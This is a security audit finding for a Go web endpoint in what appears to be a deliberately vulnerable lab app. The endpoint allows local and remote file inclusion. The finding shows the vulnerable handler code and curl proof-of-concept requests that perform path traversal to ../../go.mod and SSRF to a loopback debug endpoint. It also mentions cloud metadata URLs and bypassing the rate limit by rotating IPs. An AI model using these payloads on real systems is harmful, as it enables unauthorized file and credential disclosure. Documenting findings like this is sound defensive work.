# C6 — Local File Inclusion / Remote File Inclusion (V17)

**Severity:** Critical  
**CWE:** CWE-98 | **OWASP:** A05:2021  
**Status:** Confirmed (cold-verified)  
**Source draft:** `piolium/findings-draft/p7-017-v17-lfi-rfi.md`

## Summary

`GET /api/kitchen/recipes/view?source=` accepts two attack modes:
1. **RFI:** URLs starting with `http://` or `https://` are fetched via `http.Get` and the full response body is echoed.
2. **LFI:** Anything else is joined to `./recipes` and read via `os.ReadFile`. `filepath.Join` does not block `../` traversal.

The endpoint is unauthenticated, only rate-limited to 6/min per IP for the RFI branch (trivially bypassed with source IP rotation), and disabled only when `APP_ENV=production`.

## Vulnerable Code

`handlers/advanced_lab.go::ViewRecipe`:

```go
source := r.URL.Query().Get("source")

if strings.HasPrefix(source, "http://") || strings.HasPrefix(source, "https://") {
    resp, err := http.Get(source)
    // ... read body, return content + content_type
}

resolvedPath := filepath.Join(recipeDir, source)
data, err := os.ReadFile(resolvedPath)
```

## Impact

- **RFI:** full content echo from arbitrary URLs, including `http://127.0.0.1:4443/api/debug/info` (chains with V09 to leak session key and admin token). Also cloud metadata services (`http://169.254.169.254/...`).
- **LFI:** arbitrary filesystem read within the process working directory tree (e.g., `../../go.mod`, `../../restaurant.db`).

## PoC

**LFI:**
```bash
curl "http://localhost:4443/api/kitchen/recipes/view?source=../../go.mod"
```

Response:
```json
{
  "mode": "local", "source": "../../go.mod",
  "resolved_path": "recipes/../../go.mod",
  "content": "module xvulnv2\n\ngo 1.21\n...",
  "bytes": 251
}
```

**RFI (loopback to debug info):**
```bash
curl "http://localhost:4443/api/kitchen/recipes/view?source=http://127.0.0.1:4443/api/debug/info"
```

Response includes the full debug dump as `content`.

## Cold Verification

Re-read source: confirmed no allowlist, no prefix check on `recipeDir`, no IP filter on outbound `http.Get`. In-memory rate limit (6/min) is bypassed with source IP rotation or patient timing.
